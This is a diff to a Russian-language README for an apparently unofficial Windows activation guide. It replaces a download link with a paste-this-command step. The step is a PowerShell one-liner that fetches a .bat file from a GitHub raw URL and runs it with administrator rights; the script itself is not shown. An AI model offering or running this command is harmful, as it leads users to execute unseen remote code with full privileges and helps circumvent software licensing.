@@ -1,7 +1,13 @@
 # 🔑 Активация Windows (Guide by D1x2k)
 
-### 📥Быстрый вариант
-Вы можете не вводить команды вручную, а просто скачать готовый скрипт [**Windows Activation**](https://github.com/D1x2k/Windows-Activation-Guide/releases) из этого репозитория, запустить его от имени Администратора, и он сделает всё автоматически. Скрипт полностью безопасен, весит всего около 30 строк кода и не содержит скрытых загрузок или `.exe` файлов. Вы можете в любой момент открыть его через Блокнот, чтобы лично убедиться в чистоте кода и отсутствии вирусов.
+# 🚀 Быстрый запуск (рекомендуется)
+
+1. Откройте **Командную строку** или **Windows Terminal** **от имени Администратора**.
+2. Вставьте следующую команду и нажмите **Enter**.
+
+```cmd
+powershell -Command "$file = Join-Path $env:TEMP 'Windows-Activation.bat'; Invoke-WebRequest 'https://raw.githubusercontent.com/D1x2k/Windows-Activation-Guide/main/Windows-Activation.bat' -OutFile $file; Start-Process -FilePath $file -Verb RunAs"
+```
 
 ---
 
